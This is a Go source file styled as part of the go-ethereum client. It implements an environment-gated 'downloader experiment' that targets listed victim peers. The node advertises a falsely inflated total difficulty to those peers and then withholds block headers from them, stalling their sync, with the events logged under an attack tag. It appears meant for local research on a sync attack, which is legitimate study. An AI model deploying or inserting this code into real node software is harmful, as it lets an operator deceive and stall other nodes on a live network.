// Copyright 2026 The Go-Ethereum Authors
// This file is part of the go-ethereum library.

package eth

import (
	"fmt"
	"math/big"
	"os"
	"strconv"
	"strings"
	"sync"

	"github.com/ethereum/go-ethereum/log"
)

const (
	vicExperimentEnabledEnv  = "VIC_GETH_DOWNLOADER_EXPERIMENT_ENABLED"
	vicExperimentNetworkEnv  = "VIC_GETH_DOWNLOADER_EXPERIMENT_NETWORK_ID"
	vicExperimentVictimsEnv  = "VIC_GETH_DOWNLOADER_EXPERIMENT_VICTIM_IDS"
	vicExperimentTDOffsetEnv = "VIC_GETH_DOWNLOADER_EXPERIMENT_TD_OFFSET"
	vicExperimentObserveEnv  = "VIC_GETH_DOWNLOADER_EXPERIMENT_OBSERVE_SYNC"
)

type vicExperimentConfig struct {
	networkID uint64
	victims   map[string]struct{}
	tdOffset  *big.Int
}

var (
	vicExperimentOnce sync.Once
	vicExperiment     *vicExperimentConfig
)

func vicDownloaderExperiment() *vicExperimentConfig {
	vicExperimentOnce.Do(func() {
		if os.Getenv(vicExperimentEnabledEnv) != "1" {
			return
		}
		networkID, err := strconv.ParseUint(os.Getenv(vicExperimentNetworkEnv), 10, 64)
		if err != nil || networkID == 0 {
			log.Error("VIC geth downloader experiment disabled: invalid network ID")
			return
		}
		offset := new(big.Int)
		if _, ok := offset.SetString(os.Getenv(vicExperimentTDOffsetEnv), 10); !ok || offset.Sign() <= 0 {
			log.Error("VIC geth downloader experiment disabled: invalid TD offset")
			return
		}
		victims := make(map[string]struct{})
		for _, raw := range strings.Split(os.Getenv(vicExperimentVictimsEnv), ",") {
			id := strings.ToLower(strings.TrimSpace(raw))
			id = strings.TrimPrefix(id, "0x")
			if len(id) == 64 {
				victims[id] = struct{}{}
			}
		}
		if len(victims) == 0 {
			log.Error("VIC geth downloader experiment disabled: victim ID is missing")
			return
		}
		vicExperiment = &vicExperimentConfig{networkID: networkID, victims: victims, tdOffset: offset}
		log.Warn("VIC geth local downloader experiment enabled", "network", networkID, "victims", len(victims), "tdOffset", offset)
	})
	return vicExperiment
}

func (cfg *vicExperimentConfig) targets(peer *peer, networkID uint64) bool {
	if cfg == nil || peer == nil || cfg.networkID != networkID {
		return false
	}
	_, ok := cfg.victims[strings.ToLower(peer.Peer.ID().String())]
	return ok
}

func vicExperimentAdvertisedTD(peer *peer, networkID uint64, td *big.Int) *big.Int {
	cfg := vicDownloaderExperiment()
	if !cfg.targets(peer, networkID) || td == nil {
		return td
	}
	advertised := new(big.Int).Add(new(big.Int).Set(td), cfg.tdOffset)
	peer.Log().Warn("VIC geth downloader experiment advertising offset TD", "realTD", td, "advertisedTD", advertised)
	return advertised
}

func vicExperimentSuppressHeaders(peer *peer) bool {
	cfg := vicDownloaderExperiment()
	if cfg == nil || !cfg.targets(peer, cfg.networkID) {
		return false
	}
	peer.Log().Warn("VIC geth downloader experiment suppressing victim header response")
	return true
}

func vicExperimentObservesSync() bool {
	return os.Getenv(vicExperimentObserveEnv) == "1"
}

func (op *chainSyncOp) logExperimentCandidate(localTD *big.Int) {
	if op == nil || op.peer == nil || !vicExperimentObservesSync() {
		return
	}
	op.peer.Log().Info("[DL-ATTACK-EXP] sync_candidate", "peer", op.peer.Peer.ID().String(), "head", op.head, "td", op.td, "localTD", localTD)
}

func (op *chainSyncOp) logExperimentStart() {
	if op != nil && op.peer != nil && vicExperimentObservesSync() {
		op.peer.Log().Info("[DL-ATTACK-EXP] sync_start", "peer", op.peer.Peer.ID().String(), "mode", op.mode, "head", op.head, "td", op.td)
	}
}

func (op *chainSyncOp) logExperimentEnd(err error) {
	if op != nil && op.peer != nil && vicExperimentObservesSync() {
		op.peer.Log().Info("[DL-ATTACK-EXP] sync_end", "peer", op.peer.Peer.ID().String(), "err", fmt.Sprint(err))
	}
}
